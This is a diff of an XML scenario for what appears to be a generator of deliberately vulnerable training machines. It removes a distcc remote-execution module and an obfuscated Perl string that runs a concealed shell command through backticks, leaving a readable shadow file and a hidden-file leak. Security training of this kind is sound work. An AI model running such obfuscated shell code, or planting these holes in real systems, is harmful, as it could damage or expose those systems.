@@ -220,37 +220,13 @@
       </input>
     </utility>
 
-    <vulnerability module_path="vulnerabilities/unix/misc/distcc_exec"/>
     <vulnerability module_path="vulnerabilities/unix/access_control_misconfigurations/readable_shadow"/>
     <vulnerability module_path=".*/hidden_file">
       <input into="file_path_to_leak">
         <value>/home/challenger/.top_secret_file</value>
       </input>
       <input into="strings_to_leak" into_datastore="sensitive_code">
-        <value>no warnings;
-          `$=`;$_=\%!;($_)=/(.)/;$==++$|;($.,$/,$,,$\,$",$;,$^,$#,$~,$*,$:,@%)=($!=~/(.)(.).(.)(.)(.)(.)..(.)(.)(.)..(.)......(.)/,$"),$=++;$.++;$.++;$_++;$_++;($_,$\,$,)=($~.$"."$;$/$%[$?]$_$\$,$:$%[$?]",$"&amp;$~,$#,);$,++;$,++;$^|=$";`$_$\$,$/$:$;$~$*$%[$?]$.$~$*${#}$%[$?]$;$\$"$^$~$*.>&amp;$=`
-        </value>
-        <generator type="personal_sensitive"/>
-        <encoder type="csv">
-          <input into="strings_to_encode" into_datastore="clients">
-            <generator type="person"/>
-            <generator type="person"/>
-            <generator type="person"/>
-            <generator type="person"/>
-            <generator type="person"/>
-            <generator type="person"/>
-          </input>
-        </encoder>
-        <encoder type="csv">
-          <input into="strings_to_encode">
-            <generator type="person"/>
-            <generator type="person"/>
-            <generator type="person"/>
-            <generator type="person"/>
-            <generator type="person"/>
-            <generator type="person"/>
-          </input>
-        </encoder>
+        <value>string</value>
       </input>
     </vulnerability>
 
